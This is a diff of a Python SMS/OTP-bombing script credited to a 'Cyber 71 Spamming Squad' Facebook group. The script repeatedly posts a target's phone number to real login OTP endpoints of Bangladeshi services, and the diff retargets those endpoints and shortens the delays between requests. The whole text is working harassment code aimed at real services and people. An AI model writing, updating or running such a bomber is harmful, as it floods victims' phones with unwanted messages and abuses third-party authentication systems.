@@ -126,16 +126,16 @@ Fb Group: Cyber 71 Spamming Squad
                  sent, nsent = 0, 0
                  for i in range(1, mm +1):
                    num1 =str("0"+num)
-                   r = requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request", data={"mobile": num1})
+                   r = requests.post("https://www.bioscopelive.com/bn/login/send-otp", data={"mobile": num1})
                    if r.status_code == 200:
                      word(f"\033[0;32;40m[ {i} ]Massege Sent !")
                      sent += 1
                      i += 1
-                     time.sleep(40)
+                     time.sleep(35)
                      
                    else:
                      word(f"\033[0;31;40m[ {i} ]Massege Not Sent ")
-                     time.sleep(40)
+                     time.sleep(4)
                      
                      i+=1
 
@@ -144,7 +144,7 @@ Fb Group: Cyber 71 Spamming Squad
                  sent, nsent = 0, 0
                  for i in range(1, mm +1):
                    data={"query":"\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: \"\"\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n","variables":{"phone":num,"country":"880","uuid":"64b9bb81-93f3-4757-9e92-9cfbf34d8039","osVersionCode":"Linux armv8l","deviceBrand":"Chrome","deviceModel":"89","requestFrom":"U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s="}}
-                   res=requests.post("https://api-v4-2.hungrynaki.com/graphql", json=data)
+                   res=requests.post("https://www.bioscopelive.com/bn/login/send-otp", json=data)
                    fata = ('880'+num)
                    fata = (fata)
        # print(fata)
